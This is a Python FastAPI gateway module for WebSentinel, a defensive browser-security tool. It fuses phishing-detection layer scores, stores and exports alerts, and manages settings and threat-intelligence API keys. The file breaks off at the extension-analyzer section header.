"""
WebSentinel — FastAPI API Gateway (All Components)
Integrates C1 (Extension Analyzer), C2 (BitB Phishing), C3 (Beacon Detector), C4 (Forensics)
Launch from project root: python -m uvicorn core.main:app --port 8000
"""
# ── Windows: switch to ProactorEventLoop so Playwright can spawn Chromium ──
import sys, os, asyncio
if sys.platform == "win32":
    asyncio.set_event_loop_policy(asyncio.WindowsProactorEventLoopPolicy())

import json, tempfile, subprocess, time as _time, re as _re
import base64 as _b64, contextvars, io as _io
from urllib.parse import urlparse
from datetime import datetime
from typing import List, Optional, Set

_REPO_ROOT = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))

from fastapi import FastAPI, File, HTTPException, Response, UploadFile, WebSocket, WebSocketDisconnect
from fastapi.middleware.cors import CORSMiddleware
from fastapi.responses import HTMLResponse, StreamingResponse
from pydantic import BaseModel

# ── C1 — Malicious Browser Extension Analyzer ─────────────────────────────────
from .c1.analyzer  import analyze_extension as analyze_extension_c1
from .c1.analyzer  import sandbox_extension as sandbox_extension_c1
from .c1.analyzer  import (
    blocklist_probe, blocklist_coverage, blocklist_incomplete_ids,
    document_blocklist_entry, reload_blocklist,
)
from .c1.db        import save_result as c1_db_save, get_history as c1_db_history
from .c1.enrich    import sha256_of, store_from_url
from .c1.crx_utils import (
    extract_ext_id_from_url, is_webstore_url,
    fetch_crx_from_store, parse_crx_bytes, parse_crx_file,
    extract_crx_to_persistent_dir,
)

# ── C2 — Browser-in-the-Browser Phishing Detector ─────────────────────────────
from .c2.layer1_bitb       import check_bitb
from .c2.layer2_url        import check_url
from .c2.layer3_visual     import check_visual, HAS_HASHES as _L3_HAS_HASHES
from .c2.layer4_form       import check_form
from .c2.layer5_reputation import check_reputation, aclose as _reputation_aclose
from .c2.layer6_runtime    import check_runtime
from .c2.verified_domains  import is_verified, registered_domain as _c2_registered_domain, _is_shared_host as _c2_is_shared_host
from .c2.alert_store       import c2_alert_store
from .c2.reporter          import (generate_html_report as _c2_generate_html_report,
                                   generate_csv         as _c2_generate_csv,
                                   generate_siem_export as _c2_generate_siem,
                                   report_filename      as _c2_report_filename)

# ── C2 fusion: configurable weights + optional learned meta-classifier ─────────
_FUSION_ORDER    = ["L1", "L2", "L3", "L4", "L5", "L6"]
_DEFAULT_WEIGHTS = {"L1": 0.15, "L2": 0.25, "L3": 0.15, "L4": 0.10, "L5": 0.20, "L6": 0.15}
_fusion_model = None
_FUSION_PATH  = os.path.join(_REPO_ROOT, "models", "c2_fusion.pkl")
try:
    import pickle as _pickle
    with open(_FUSION_PATH, "rb") as _ff:
        _fusion_model = _pickle.load(_ff)
    print("[C2-fusion] Loaded learned fusion meta-classifier")
except FileNotFoundError:
    print("[C2-fusion] No c2_fusion.pkl — using weighted-sum fusion")


def _fuse_score(layer_results: list, weights: dict,
                t_susp: float = 30, t_phish: float = 60,
                breakdown: Optional[dict] = None) -> float:
    """Fused risk 0–100. Uses the learned meta-classifier when present and all six
    layers ran; otherwise a configurable weighted sum over whatever layers ran.

    Decisive-signal floor: a near-certain BitB DOM (L1 *heuristic* sub-score, not the
    ML overlay) can never be washed out by the weighted sum — a confirmed
    browser-in-the-browser kit IS credential phishing on its own.

    Pass `breakdown` to have the reasoning recorded into it: which path produced the
    number, the weights actually applied, and whether the L1 floor raised it. The
    return value is unchanged, so existing callers are unaffected. Without this an
    alert stores a bare risk score and there is no way to answer "why 72?" after
    the fact — which is the whole point of the stored-alert detail view."""
    scores = {lr["id"]: float(lr["score"]) for lr in layer_results}
    risk = 0.0
    method = "weighted_sum"
    if _fusion_model is not None and all(k in scores for k in _FUSION_ORDER):
        try:
            import pandas as pd
            X = pd.DataFrame([[scores[k] for k in _FUSION_ORDER]], columns=_FUSION_ORDER)
            risk = float(_fusion_model.predict_proba(X)[0][1]) * 100
            method = "meta_classifier"
        except Exception:
            risk = 0.0
            method = "weighted_sum"
    if risk == 0.0:
        method = "weighted_sum"
        risk = sum(s * weights.get(lid, 0.0) for lid, s in scores.items()) * 100

    pre_floor = risk
    floor_applied = None
    l1 = scores.get("L1")
    l1_h = None
    if l1 is not None:
        l1_row = next((lr for lr in layer_results if lr["id"] == "L1"), {})
        # heuristic sub-score when available (ML overlay can FP on out-of-distribution
        # pages, so the floor keys off the deterministic heuristic signals only)
        l1_h = float(l1_row.get("heuristic", l1))
        if l1_h >= 0.9:
            risk = max(risk, t_phish)   # definitive BitB kit DOM → PHISHING
            if risk > pre_floor:
                floor_applied = "phishing"
        elif l1_h >= 0.7:
            risk = max(risk, t_susp)    # strong multi-rule hit → at least SUSPICIOUS
            if risk > pre_floor:
                floor_applied = "suspicious"

    if breakdown is not None:
        breakdown.update({
            "method":            method,
            "layer_scores":      {k: round(v, 4) for k, v in scores.items()},
            "weights_applied":   ({k: weights.get(k, 0.0) for k in scores}
                                  if method == "weighted_sum" else None),
            "pre_floor_risk":    round(pre_floor, 1),
            "l1_heuristic":      l1_h,
            "floor_applied":     floor_applied,
            "thresholds":        {"suspicious": t_susp, "phishing": t_phish},
            "final_risk":        round(risk, 1),
        })
    return risk

# ── C3 — Browser Execution-Aware C2 Beacon Detector ───────────────────────────
from .c3.context_tagger  import c3_tagger
from .c3.interceptor     import c3_interceptor
from .c3.analyzer        import c3_analyzer
from .c3.alert_store     import c3_alert_store
from .c3.reputation_engine import set_virustotal_key as _c3_set_virustotal_key
from .c3.reputation_engine import set_abuseipdb_key as _c3_set_abuseipdb_key

# ── C4 — Browser Artifact Forensic Correlation Engine ─────────────────────────
from .c4 import (
    get_default_profile_path,
    get_last_result,
    get_summary as get_c4_summary,
    render_last_html,
    render_last_json,
    render_last_siem,
    report_filename,
    run_forensic_analysis,
)

# ── Shared Playwright session ──────────────────────────────────────────────────
from .playwright_session import pw_session, PROFILE_DIR as PW_PROFILE_DIR

# ══════════════════════════════════════════════════════════════════════════════
from contextlib import asynccontextmanager

@asynccontextmanager
async def lifespan(app):
    # Auto-start the Playwright browser when the server boots
    global _session_starting
    _session_starting = True
    pw_session.clear_callbacks()
    pw_session.add_nav_callback(_pw_nav_handler)
    pw_session.add_click_callback(_on_extension_install_click)
    pw_session.add_close_callback(_pw_tab_closed)
    asyncio.create_task(_bg_start_session())
    yield
    # Graceful shutdown
    await c3_analyzer.stop_loop()
    await c3_interceptor.stop()
    await pw_session.stop()
    await _reputation_aclose()

app = FastAPI(title="WebSentinel API", version="4.0.0", lifespan=lifespan)

app.add_middleware(
    CORSMiddleware,
    allow_origins=["*"],
    allow_methods=["*"],
    allow_headers=["*"],
)

# ── WebSocket broadcast set ────────────────────────────────────────────────────
_ws_clients: Set[WebSocket] = set()
_session_starting = False

async def _broadcast(data: dict) -> None:
    clients = list(_ws_clients)
    if not clients:
        return
    # Send to all clients concurrently so one slow/stuck client can't delay the others.
    results = await asyncio.gather(*(ws.send_json(data) for ws in clients),
                                   return_exceptions=True)
    dead = {ws for ws, r in zip(clients, results) if isinstance(r, Exception)}
    if dead:
        _ws_clients.difference_update(dead)

# ── Analyzing page shown in the Playwright browser while C1 scans an extension ─
_ANALYZING_HTML = """\
<!DOCTYPE html>
<html>
<head>
<meta charset="utf-8">
<title>WebSentinel — Analyzing Extension</title>
<style>
  *{{margin:0;padding:0;box-sizing:border-box}}
  body{{background:#0a0e1a;color:#e2e8f0;font-family:system-ui,sans-serif;
       display:flex;align-items:center;justify-content:center;min-height:100vh}}
  .card{{text-align:center;max-width:440px;padding:48px 40px;
        background:#131929;border:1px solid #1e2d45;border-radius:16px}}
  .spinner{{width:56px;height:56px;border:4px solid #1e2d45;
           border-top-color:#3b82f6;border-radius:50%;
           animation:spin .9s linear infinite;margin:0 auto 28px}}
  @keyframes spin{{to{{transform:rotate(360deg)}}}}
  h1{{font-size:18px;font-weight:700;color:#f1f5f9;margin-bottom:10px}}
  .ext{{font-size:11px;font-family:monospace;color:#64748b;
       background:#0a0e1a;padding:4px 10px;border-radius:6px;
       display:inline-block;margin-bottom:20px}}
  p{{font-size:13px;color:#94a3b8;line-height:1.6}}
  .badge{{margin-top:28px;font-size:11px;color:#3b82f6;letter-spacing:.05em}}
</style>
</head>
<body>
<div class="card">
  <div class="spinner"></div>
  <h1>Analyzing Extension</h1>
  <div class="ext">{ext_id}</div>
  <p>WebSentinel is scanning this extension for malicious behavior.<br>
     Check the <strong>WebSentinel dashboard → C1</strong> panel for results.</p>
  <div class="badge">WEBSENTINEL &middot; C1 EXTENSION ANALYZER</div>
</div>
</body>
</html>"""

# ── In-memory state ────────────────────────────────────────────────────────────
alerts: list = []
c1_history: list = []
_pending_installs: dict = {}


def _store_c2_alert(record: dict) -> dict:
    """Write one C2 analysis through to the persistent store.

    Analysis must never fail because persistence did — a read-only home
    directory or a locked DB should cost the alert log, not the detection. On
    failure the caller simply gets no id back and the alert stays in-memory
    exactly as it behaved before the store existed.
    """
    try:
        return c2_alert_store.add_alert(record)
    except Exception as exc:
        print(f"[C2] Could not persist alert: {exc}")
        return {}

# Packaged (PyInstaller) builds live in a read-only install dir, so mutable
# settings go to the per-user data dir instead of next to this file.
if getattr(sys, "frozen", False):
    _USER_DATA_DIR = os.path.join(os.path.expanduser("~"), ".websentinel")
    os.makedirs(_USER_DATA_DIR, exist_ok=True)
    _SETTINGS_FILE = os.path.join(_USER_DATA_DIR, "settings.json")
else:
    _SETTINGS_FILE = os.path.join(os.path.dirname(__file__), "settings.json")

_SETTINGS_DEFAULTS: dict = {
    "layers": {"l1": True, "l2": True, "l3": True, "l4": True, "l5": True, "l6": True},
    "whitelist": [],
    "gsb_key": "",           # C2 Layer-5 phishing check (Google Safe Browsing)
    "abuseipdb_key": "",     # C3 reputation engine
    "virustotal_key": "",    # C3 reputation engine (replaced GSB here 2026-08-29)
    # ngrok authtoken for C3's TC-03 (real-world beacon test). Saved by
    # POST /c3/ngrok-auth, kept until cleared there, handed to ngrok through
    # its NGROK_AUTHTOKEN env var only when that test starts a tunnel, and
    # never returned by GET /settings or GET /c3/ngrok-auth.
    "ngrok_authtoken": "",
    "pw_home_url": "",
    # C1 dynamic sandbox containment. "auto" picks the strongest backend the
    # machine can actually provide; naming one forces it (and reports a
    # downgrade in the result if it turns out to be unavailable).
    "c1_isolation_backend": "auto",       # auto | windows_sandbox | inprocess
    "c1_sandbox_network":   "unrestricted",  # unrestricted | disabled
    "warn_threshold": 30,            # risk_score >= this -> warning banner
    "block_threshold": 60,           # risk_score >= this -> blocking interstitial
    "interstitial_enabled": True,    # show in-browser warning/block overlays
    "weights": dict(_DEFAULT_WEIGHTS),  # fusion weights (overwritten by tune_fusion)
    "verdict_suspicious": 30,        # risk_score >= this -> SUSPICIOUS
    "verdict_phishing": 60,          # risk_score >= this -> PHISHING
    "runtime_active_probe": False,   # L6: actively probe password field for keyloggers
    "phishtank_enabled": True,       # L5: query the PhishTank public feed (off = GSB only)
    "live_preview": True,            # C2 Live Analysis: send a small page thumbnail with each result
}

def _load_settings() -> dict:
    try:
        with open(_SETTINGS_FILE, "r", encoding="utf-8") as f:
            data = json.load(f)
        merged = dict(_SETTINGS_DEFAULTS)
        merged.update(data)
        return merged
    except (FileNotFoundError, json.JSONDecodeError):
        return dict(_SETTINGS_DEFAULTS)

def _save_settings(s: dict) -> bool:
    try:
        with open(_SETTINGS_FILE, "w", encoding="utf-8") as f:
            json.dump(s, f, indent=2)
        return True
    except Exception:
        return False

settings: dict = _load_settings()
_c3_set_virustotal_key(settings.get("virustotal_key", ""))
_c3_set_abuseipdb_key(settings.get("abuseipdb_key", ""))


def _apply_sandbox_settings() -> dict:
    """Push the stored isolation choice into the C1 sandbox module."""
    from .c1 import sandbox as c1_sandbox
    backend = settings.get("c1_isolation_backend", "auto")
    return c1_sandbox.configure(
        backend="" if backend == "auto" else backend,
        network_policy=settings.get("c1_sandbox_network", ""),
    )


_apply_sandbox_settings()

# ── Request / response models ──────────────────────────────────────────────────
class AnalyzeReq(BaseModel):
    url: str
    dom: Optional[str] = None
    screenshot: Optional[str] = None
    runtime: Optional[dict] = None

class SettingsReq(BaseModel):
    layers: dict
    whitelist: List[str] = []
    gsb_key: str = ""            # C2 Layer-5 phishing check
    # C3 reputation engine. None = "not sent": leave the saved key alone. Only
    # an explicit string (even "") changes it -- panels that do not carry these
    # fields (the main Settings page) used to reset both keys to empty here.
    abuseipdb_key: Optional[str] = None
    virustotal_key: Optional[str] = None
    pw_home_url: str = ""
    c1_isolation_backend: str = "auto"
    c1_sandbox_network: str = "unrestricted"
    warn_threshold: int = 30
    block_threshold: int = 60
    interstitial_enabled: bool = True
    weights: Optional[dict] = None
    verdict_suspicious: int = 30
    verdict_phishing: int = 60
    runtime_active_probe: bool = False
    live_preview: bool = True

class ExtensionAnalyzeReq(BaseModel):
    manifest: str
    source_code: Optional[str] = ""
    extension_id: Optional[str] = ""
    extension_path: Optional[str] = ""

class SandboxReq(BaseModel):
    extension_path: str

class InstallExtensionReq(BaseModel):
    url_or_id: str
    force: bool = False

class WebstoreLookupReq(BaseModel):
    url_or_id: str

class ApproveInstallReq(BaseModel):
    ext_id: str

class BlocklistDocumentReq(BaseModel):
    """Document one under-reported blocklist row on demand."""
    ext_id: str
    sandbox: bool = True

class BlocklistBackfillReq(BaseModel):
    """Sweep the sheet and document every row that still has gaps.

    `sandbox` is off by default: a full sweep is thousands of extensions and
    each sandbox run costs ~20 s of headed Chromium, so bulk passes stay on
    the static stack. Live intercepts always run the sandbox.
    """
    limit: int = 25
    sandbox: bool = False
    concurrency: int = 4

class C3CollectReq(BaseModel):
    label: int

class ForensicReq(BaseModel):
    profile_path: Optional[str] = None
    save_outputs: bool = True

class NavigateReq(BaseModel):
    url: str


# ══════════════════════════════════════════════════════════════════════════════
#  Core / shared endpoints
# ══════════════════════════════════════════════════════════════════════════════

@app.get("/health")
async def health():
    return {"status": "ok", "timestamp": datetime.now().isoformat(), "alerts": len(alerts)}


# ══════════════════════════════════════════════════════════════════════════════
#  C2 — BitB Phishing Detection
# ══════════════════════════════════════════════════════════════════════════════

# ── C2 Live Analysis: progress events + plain-English reasons ────────────────
# _pw_nav_handler() sets this for the tab it is analysing; analyze() reads it so
# each detection layer can report the moment it finishes. Direct /analyze calls
# (tests, the REST API) leave it unset and behave exactly as before.
_c2_live_ctx: contextvars.ContextVar = contextvars.ContextVar("c2_live_ctx", default=None)
_C2_WARN_LINE = 0.28   # layer score at which the UI shows a layer as "warn"


async def _c2_emit_layer(lid: str, lname: str, res) -> None:
    """Broadcast one finished layer to the live view. Never raises."""
    ctx = _c2_live_ctx.get()
    if not ctx:
        return
    try:
        if isinstance(res, BaseException):
            row = {"id": lid, "name": lname, "score": 0.0, "detail": f"Error: {res}"}
        else:
            row = {"id": lid, "name": lname,
                   "score": round(float(res.get("score", 0.0)), 4),
                   "detail": res.get("detail", "")}
        await _broadcast({"type": "c2_layer", "tab_id": ctx["tab_id"],
                          "url": ctx["url"], "layer": row})
    except Exception:
        pass


def _c2_build_reasons(layers: list, verdict: str, fusion: Optional[dict] = None,
                      verified: bool = False) -> List[str]:
    """Top reasons for a verdict, in plain English, for the live card."""
    if verified and not layers:
        return ["Verified domain: the heuristic layers were skipped and no reputation feed flagged it"]
    ranked = sorted((l for l in layers if float(l.get("score") or 0) >= _C2_WARN_LINE),
                    key=lambda l: float(l.get("score") or 0), reverse=True)
    out: List[str] = []
    for l in ranked[:3]:
        pct = round(float(l.get("score") or 0) * 100)
        name = l.get("name") or l.get("id") or "Layer"
        detail = str(l.get("detail") or "").strip()
        out.append(f"{name} ({pct}%): {detail[:140]}" if detail else f"{name} flagged this page at {pct}%")
    floor = (fusion or {}).get("floor_applied")
    if floor:
        pre, fin = (fusion or {}).get("pre_floor_risk"), (fusion or {}).get("final_risk")
        if pre is not None and fin is not None:
            out.append(f"A hard rule raised the verdict to {floor.upper()} "
                       f"(weighted score {float(pre):.0f} became {float(fin):.0f})")
        else:
            out.append(f"A hard rule raised the verdict to {str(floor).upper()}")
    if out and verdict == "SAFE":
        # A strong single signal on a page that still scored SAFE would otherwise
        # read as a contradiction in the live card.
        out.insert(0, "Some signals fired, but the combined risk stayed below the suspicious threshold")
    if not out:
        out.append("No detection layer exceeded the warning line")
    return out


@app.post("/analyze")
async def analyze(req: AnalyzeReq):
    url = req.url
    for prefix in ("about:", "chrome:", "devtools:", "electron:"):
        if url.startswith(prefix):
            return {"url": url, "verdict": "SKIP", "risk_score": 0,
                    "layers": [], "timestamp": datetime.now().isoformat()}

    for domain in settings["whitelist"]:
        if domain and domain.lower() in url.lower():
            return {"url": url, "verdict": "WHITELISTED", "risk_score": 0,
                    "layers": [], "timestamp": datetime.now().isoformat()}

    ly = settings["layers"]

    # ── Verified-domain trust gate ────────────────────────────────────────────
    # Known-good sites (Tranco allowlist, eTLD+1 match, shared hosts excluded) skip
    # the FP-prone heuristic layers but still get a reputation check, so a
    # compromised-but-listed domain can still be flagged as PHISHING.
    if is_verified(url):
        if ly.get("l5", True):
            rep = await check_reputation(url, settings["gsb_key"],
                                         settings.get("phishtank_enabled", True))
        else:
            rep = {"score": 0.0, "flagged": False, "detail": "L5 disabled"}
        timestamp = datetime.now().isoformat()
        if rep.get("flagged"):
            risk_score = round(min(100.0, float(rep["score"]) * 100), 1)
            l5_row = {"id": "L5", "name": "Reputation Check",
                      "score": round(float(rep["score"]), 4),
                      "detail": rep.get("detail", "")}
            if isinstance(rep.get("evidence"), dict):
                l5_row["evidence"] = rep["evidence"]
            result = {"url": url, "verdict": "PHISHING", "risk_score": risk_score,
                      "layers": [{k: v for k, v in l5_row.items() if k != "evidence"}],
                      "verified": True,
                      "reasons": _c2_build_reasons([l5_row], "PHISHING", None, verified=True),
                      "timestamp": timestamp}
            stored_layers = [l5_row]
        else:
            result = {"url": url, "verdict": "VERIFIED", "risk_score": 0.0,
                      "layers": [], "verified": True,
                      "reasons": _c2_build_reasons([], "VERIFIED", None, verified=True),
                      "timestamp": timestamp}
            stored_layers = []

        # Verified-domain outcomes are persisted too — "this domain was on the
        # allow-list and we let it through" is exactly the decision an audit of a
        # missed phish needs to see.
        stored = _store_c2_alert({"url": url, "verdict": result["verdict"],
                                  "risk_score": result["risk_score"],
                                  "layers": stored_layers,
                                  "fusion": {"method": "verified_domain_gate"},
                                  "verified": True, "timestamp": timestamp})
        if stored.get("id") is not None:
            result["id"] = stored["id"]

        alerts.insert(0, result)
        if len(alerts) > 500:
            alerts.pop()
        return result

    layer_results = []
    weights = settings.get("weights") or _DEFAULT_WEIGHTS

    pt_enabled = settings.get("phishtank_enabled", True)
    layer_jobs = []
    if ly.get("l1", True): layer_jobs.append(("L1", "BitB Detection",    check_bitb(url, req.dom or "")))
    if ly.get("l2", True): layer_jobs.append(("L2", "URL Analysis",      check_url(url)))
    if ly.get("l3", True): layer_jobs.append(("L3", "Visual Similarity", check_visual(url, req.screenshot or "")))
    if ly.get("l4", True): layer_jobs.append(("L4", "Form Destination",  check_form(url, req.dom or "")))
    if ly.get("l5", True): layer_jobs.append(("L5", "Reputation Check",  check_reputation(url, settings["gsb_key"], pt_enabled)))
    if ly.get("l6", True): layer_jobs.append(("L6", "Runtime Behavior",  check_runtime(url, req.runtime)))

    # Run all layers concurrently: CPU layers (L1/L2/L3) run in worker threads while the
    # L5 network lookup overlaps — order is preserved from layer_jobs for the result rows.
    async def _run_layer(lid, lname, coro):
        try:
            res = await coro
        except BaseException as exc:          # report, then re-raise for gather()
            await _c2_emit_layer(lid, lname, exc)
            raise
        await _c2_emit_layer(lid, lname, res)
        return res

    outcomes = await asyncio.gather(*(_run_layer(lid, lname, coro) for lid, lname, coro in layer_jobs),
                                    return_exceptions=True)
    for (lid, lname, _), res in zip(layer_jobs, outcomes):
        if isinstance(res, Exception):
            layer_results.append({"id": lid, "name": lname, "score": 0.0,
                                  "detail": f"Error: {res}",
                                  "evidence": {"error": str(res),
                                               "error_type": type(res).__name__}})
        else:
            row = {"id": lid, "name": lname,
                   "score": round(float(res["score"]), 4),
                   "detail": res.get("detail", "")}
            # L1's deterministic heuristic sub-score feeds the fusion floor (§ _fuse_score)
            if lid == "L1" and "heuristic" in res:
                row["heuristic"] = res["heuristic"]
            # Per-layer measurements behind the score (feature vectors, matched
            # hosts, feed verdicts). Carried on the internal row only — it is
            # stripped from the live payload below and reaches the UI through
            # the stored alert, so /alerts stays small.
            if isinstance(res.get("evidence"), dict):
                row["evidence"] = res["evidence"]
            layer_results.append(row)

    t_phish = settings.get("verdict_phishing", 60)
    t_susp  = settings.get("verdict_suspicious", 30)
    fusion_breakdown: dict = {}
    risk_score = round(min(100.0, max(0.0, _fuse_score(layer_results, weights,
                                                       t_susp, t_phish,
                                                       breakdown=fusion_breakdown))), 1)
    verdict = "PHISHING" if risk_score >= t_phish else "SUSPICIOUS" if risk_score >= t_susp else "SAFE"

    # strip the internal heuristic sub-score and the per-layer evidence from the
    # public payload — /alerts returns up to 50 of these and the evidence would
    # dominate the response. The detail view fetches it from /alerts/{id}.
    public_layers = [{k: v for k, v in lr.items() if k not in ("heuristic", "evidence")}
                     for lr in layer_results]
    timestamp = datetime.now().isoformat()
    result = {"url": url, "verdict": verdict, "risk_score": risk_score,
              "layers": public_layers,
              "reasons": _c2_build_reasons(public_layers, verdict, fusion_breakdown),
              "timestamp": timestamp}

    # Persist the full record (evidence + fusion reasoning) so it survives a
    # restart and can be opened, reported on and exported later. The in-memory
    # list stays as the hot cache the live pane already reads.
    stored = _store_c2_alert({"url": url, "verdict": verdict, "risk_score": risk_score,
                              "layers": layer_results, "fusion": fusion_breakdown,
                              "verified": False, "timestamp": timestamp})
    if stored.get("id") is not None:
        result["id"] = stored["id"]

    alerts.insert(0, result)
    if len(alerts) > 500:
        alerts.pop()
    return result


@app.get("/alerts")
async def get_alerts(limit: int = 50):
    return alerts[:limit]


# ── C2 alert log, detail and exports ──────────────────────────────────────────
# Route order matters: every literal path below must be registered BEFORE
# /alerts/{alert_id}, or FastAPI matches "history" and "export.csv" as an id.

@app.get("/alerts/history")
async def alerts_history(limit: int = 50, verdict: str = "", since: str = ""):
    """Persisted C2 alert log. Unlike /alerts (in-memory, lost on restart) this
    reads the store, so it survives a restart and can be filtered."""
    return await asyncio.to_thread(c2_alert_store.list_alerts, limit, verdict, since)


@app.get("/alerts/stats")
async def alerts_stats():
    recent = await asyncio.to_thread(c2_alert_store.list_alerts, 500, "", "")
    by_verdict: dict = {}
    for a in recent:
        by_verdict[a["verdict"]] = by_verdict.get(a["verdict"], 0) + 1
    return {"total_stored": await asyncio.to_thread(c2_alert_store.count),
            "in_memory": len(alerts),
            "by_verdict": by_verdict,
            "db_path": c2_alert_store.path}


@app.get("/alerts/export.csv")
async def alerts_export_csv(limit: int = 500, verdict: str = "", since: str = ""):
    rows = await asyncio.to_thread(c2_alert_store.list_alerts, limit, verdict, since)
    return Response(_c2_generate_csv(rows), media_type="text/csv",
        headers={"Content-Disposition":
                 f"attachment; filename={_c2_report_filename('alerts')}.csv"})


@app.get("/alerts/export.siem")
async def alerts_export_siem(limit: int = 500, verdict: str = "", since: str = ""):
    rows = await asyncio.to_thread(c2_alert_store.list_alerts, limit, verdict, since)
    payload = json.dumps(_c2_generate_siem(rows), indent=2, default=str)
    return Response(payload, media_type="application/json",
        headers={"Content-Disposition":
                 f"attachment; filename={_c2_report_filename('siem')}.json"})


@app.get("/alerts/export.json")
async def alerts_export_json(limit: int = 500, verdict: str = "", since: str = ""):
    rows = await asyncio.to_thread(c2_alert_store.list_alerts, limit, verdict, since)
    payload = json.dumps({"export_type": "C2_Alert_Log",
                          "generated_at": datetime.now().isoformat(),
                          "total_alerts": len(rows),
                          "alerts": rows}, indent=2, default=str)
    return Response(payload, media_type="application/json",
        headers={"Content-Disposition":
                 f"attachment; filename={_c2_report_filename('alerts')}.json"})


def _get_c2_alert_or_404(alert_id: int) -> dict:
    alert = c2_alert_store.get_alert(alert_id)
    if not alert:
        raise HTTPException(status_code=404, detail=f"No C2 alert with id {alert_id}")
    return alert


@app.get("/alerts/{alert_id}")
async def get_alert_detail(alert_id: int):
    """One alert with the full per-layer evidence and fusion breakdown. /alerts
    strips both to keep the list payload small, so this is what the detail modal
    and the report endpoints read."""
    return await asyncio.to_thread(_get_c2_alert_or_404, alert_id)


@app.get("/alerts/{alert_id}/report.html")
async def get_alert_report_html(alert_id: int):
    alert = await asyncio.to_thread(_get_c2_alert_or_404, alert_id)
    html = await asyncio.to_thread(_c2_generate_html_report, alert)
    return Response(html, media_type="text/html",
        headers={"Content-Disposition":
                 f"attachment; filename={_c2_report_filename(f'report_{alert_id}')}.html"})


@app.get("/alerts/{alert_id}/report.json")
async def get_alert_report_json(alert_id: int):
    alert = await asyncio.to_thread(_get_c2_alert_or_404, alert_id)
    return Response(json.dumps(alert, indent=2, default=str),
        media_type="application/json",
        headers={"Content-Disposition":
                 f"attachment; filename={_c2_report_filename(f'report_{alert_id}')}.json"})


@app.post("/settings")
async def save_settings(req: SettingsReq):
    settings.update({"layers": req.layers, "whitelist": req.whitelist,
                     "gsb_key": req.gsb_key, "pw_home_url": req.pw_home_url,
                     "c1_isolation_backend": req.c1_isolation_backend,
                     "c1_sandbox_network": req.c1_sandbox_network,
                     "warn_threshold": req.warn_threshold,
                     "block_threshold": req.block_threshold,
                     "interstitial_enabled": req.interstitial_enabled,
                     "verdict_suspicious": req.verdict_suspicious,
                     "verdict_phishing": req.verdict_phishing,
                     "runtime_active_probe": req.runtime_active_probe,
                     "live_preview": req.live_preview})
    if req.weights:
        settings["weights"] = req.weights
    # C3 threat-intel keys: saved to settings.json (so they survive a restart)
    # and pushed to the C3 reputation engine, but only when this request
    # actually carries them.
    if req.abuseipdb_key is not None:
        settings["abuseipdb_key"] = req.abuseipdb_key.strip()
    if req.virustotal_key is not None:
        settings["virustotal_key"] = req.virustotal_key.strip()
    _save_settings(settings)
    _c3_set_virustotal_key(settings.get("virustotal_key", ""))
    _c3_set_abuseipdb_key(settings.get("abuseipdb_key", ""))
    # C1 re-applies its isolation backend / sandbox networking on every save.
    applied = _apply_sandbox_settings()
    return {"status": "saved", "sandbox": applied}


@app.get("/settings")
async def get_settings():
    # The ngrok authtoken is a credential for the user's ngrok account, so it
    # is reported only as set/not-set, never echoed back to the page.
    out = {k: v for k, v in settings.items() if k != "ngrok_authtoken"}
    out["ngrok_authtoken_set"] = bool(settings.get("ngrok_authtoken"))
    return out


class NgrokAuthReq(BaseModel):
    authtoken: str = ""          # empty string clears the saved token


def _ngrok_auth_status() -> dict:
    tok = str(settings.get("ngrok_authtoken") or "")
    return {"configured": bool(tok), "hint": tok[-4:] if len(tok) >= 12 else ""}


@app.get("/c3/ngrok-auth")
async def c3_ngrok_auth_status():
    """Whether an ngrok authtoken is saved (never the token itself)."""
    return _ngrok_auth_status()


@app.post("/c3/ngrok-auth")
async def c3_ngrok_auth_save(req: NgrokAuthReq):
    """Save (or, with an empty value, clear) the ngrok authtoken used by TC-03.

    Persisted in settings.json alongside the other keys, so it survives a
    restart and stays until it is cleared here.
    """
    token = (req.authtoken or "").strip()
    if token and not _re.fullmatch(r"[A-Za-z0-9_\-]{20,200}", token):
        raise HTTPException(status_code=422,
                            detail="That does not look like an ngrok authtoken "
                                   "(letters, digits, _ and - only, no spaces). "
                                   "Copy it from dashboard.ngrok.com > Your Authtoken.")
    settings["ngrok_authtoken"] = token
    if not _save_settings(settings):
        raise HTTPException(status_code=500, detail="Could not write settings.json, so the token was not saved.")
    return _ngrok_auth_status()


class C3TiKeysReq(BaseModel):
    # None = leave that key as it is; a string (even "") replaces it.
    abuseipdb_key: Optional[str] = None
    virustotal_key: Optional[str] = None


@app.post("/c3/ti-keys")
async def c3_ti_keys_save(req: C3TiKeysReq):
    """Save the C3 threat-intelligence keys (AbuseIPDB / VirusTotal).

    Updates only the key(s) in the request, writes them to settings.json so they
    stay until replaced, and applies them to the reputation engine immediately.
    Unlike POST /settings this never touches any other setting.
    """
    for name, val in (("abuseipdb_key", req.abuseipdb_key), ("virustotal_key", req.virustotal_key)):
        if val is None:
            continue
        val = val.strip()
        if len(val) > 300 or any(ch.isspace() for ch in val):
            raise HTTPException(status_code=422,
                                detail=f"That {name.split('_')[0]} key has spaces or is far too long; "
                                       f"paste just the key.")
        settings[name] = val
    if not _save_settings(settings):
        raise HTTPException(status_code=500, detail="Could not write settings.json, so the key was not saved.")
    _c3_set_abuseipdb_key(settings.get("abuseipdb_key", ""))
    _c3_set_virustotal_key(settings.get("virustotal_key", ""))
    return {"abuseipdb_key": bool(settings.get("abuseipdb_key")),
            "virustotal_key": bool(settings.get("virustotal_key"))}


class WhitelistReq(BaseModel):
    domain: str            # a hostname or a full URL
    remove: bool = False   # True = undo a previous add


@app.post("/c2/whitelist")
async def c2_whitelist(req: WhitelistReq):
    """Trust (or stop trusting) one host from the C2 Live Analysis card.

    Stores the exact hostname, not the registered domain: analyze() matches the
    whitelist by substring, so trusting 'login.example.com' must not silently
    trust everything under a shared host like yolasite.com.
    """
    raw = (req.domain or "").strip()
    host = (urlparse(raw if "://" in raw else "https://" + raw).hostname or "").lower()
    if host.startswith("www."):
        host = host[4:]
    if not host or "." not in host:
        raise HTTPException(status_code=400, detail="That is not a valid host name")
    reg = _c2_registered_domain(host)
    if host == reg and _c2_is_shared_host(host, reg):
        raise HTTPException(status_code=400,
            detail=f"{host} is a shared hosting provider; trusting it would trust every site on it")
    wl = [d for d in settings.get("whitelist", []) if d]
    if req.remove:
        wl = [d for d in wl if d.lower() != host]
    elif host not in [d.lower() for d in wl]:
        wl.append(host)
    settings["whitelist"] = wl
    _save_settings(settings)
    return {"status": "removed" if req.remove else "added", "domain": host, "whitelist": wl}


# ══════════════════════════════════════════════════════════════════════════════
#  C1 — Malicious Browser Extension Analyzer
# ══════════════════════════════════════════════════════════════════════════════

